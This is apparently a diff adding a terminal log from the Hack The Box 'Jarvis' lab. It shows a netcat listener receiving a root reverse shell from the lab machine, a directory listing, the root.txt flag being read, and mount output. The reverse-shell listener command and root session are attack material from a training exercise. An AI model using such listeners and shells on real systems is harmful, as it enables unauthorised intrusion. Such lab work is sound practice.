@@ -1,0 +1,54 @@
+┌─[root@parrot]─[~/hackthebox/jarvis]   
+└──╼ #nc -nvlp 9001 
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                     
+Ncat: Listening on :::9001              
+Ncat: Listening on 0.0.0.0:9001         
+Ncat: Connection from 10.10.10.143.     
+Ncat: Connection from 10.10.10.143:48596.                                        
+bash: cannot set terminal process group (19534): Inappropriate ioctl for device  
+bash: no job control in this shell      
+root@jarvis:/# ls   
+ls                  
+bin                 
+boot                
+dev                 
+etc                 
+home                
+initrd.img          
+initrd.img.old      
+lib                 
+lib32               
+lib64               
+lost+found          
+media               
+mnt                 
+opt                 
+proc                
+root                
+run                 
+sbin                
+srv                 
+sys                 
+tmp                 
+usr                 
+var                 
+vmlinuz             
+vmlinuz.old         
+root@jarvis:/# cd ~ 
+cd ~                
+root@jarvis:/root# ls                   
+ls                  
+clean.sh            
+root.txt            
+sqli_defender.py    
+root@jarvis:/root# cat root.txt         
+cat root.txt        
+d41d8cd98f00b204e9800998ecf84271        
+root@jarvis:/root# mount | grep tmp     
+mount | grep tmp    
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=489576k,nr_inodes=122394,mode=755)               
+tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=100152k,mode=755)       
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)                                   
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)       
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)             
+root@jarvis:/root#  
